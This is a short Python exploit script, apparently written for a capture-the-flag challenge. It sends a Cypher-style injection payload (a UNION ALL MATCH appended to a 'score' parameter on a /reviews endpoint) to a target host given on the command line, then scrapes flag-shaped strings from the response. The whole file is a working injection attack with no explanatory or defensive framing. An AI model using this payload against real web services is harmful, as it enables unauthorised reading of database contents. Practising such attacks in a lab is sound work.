#!/usr/bin/env python3

# WORDLIST:	/usr/share/wordlists/rockyou.txt

# from urllib.parse import quote, unquote			#unquote("%2F")		quote("\")
# from html import unescape
# from hashlib import md5

# import random
# from pwn import *
# from os import system
# from base64 import *
# from json import dumps, loads							#dumps({"key":"value"})

# import string

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

import requests
import re
import sys

flagRegEx = re.compile(r'[A-Za-z0-9]{31}=')

host = sys.argv[1]

def main():
	resp = requests.get(f'http://{host}/reviews?score=1+ReTURn+r+LIMIT+1+UNION+ALL+MATCH+%28r%3AReview%29')
	[print(i) for i in flagRegEx.findall( resp.text )]


if __name__ == "__main__":
	main()
